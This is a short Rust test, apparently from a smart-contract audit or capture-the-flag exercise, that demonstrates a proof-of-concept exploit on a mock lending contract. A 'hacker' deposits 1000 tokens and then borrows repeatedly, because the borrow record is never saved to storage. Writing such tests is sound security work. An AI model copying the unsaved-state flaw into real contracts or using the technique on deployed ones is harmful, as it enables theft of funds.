#[test]
fn exploit() {
    let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

    let msg = InstantiateMsg {};
    let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
    let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    // hacker deposits 1000 funds
    let info = mock_info("hacker", &coins(1_000, "uosmo"));
    let msg = ExecuteMsg::Deposit {};
    let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    let empty_fund: Vec<Coin> = vec![];
    let info = mock_info("hacker", &empty_fund);
    let msg = ExecuteMsg::Borrow {
        amount: Uint128::from(500_u64),
    };

    // hacker able to repeatly borrow 500 funds because USER_BORROW is not saved into storage
    let _res = execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    let _res = execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    let _res = execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    let _res = execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
}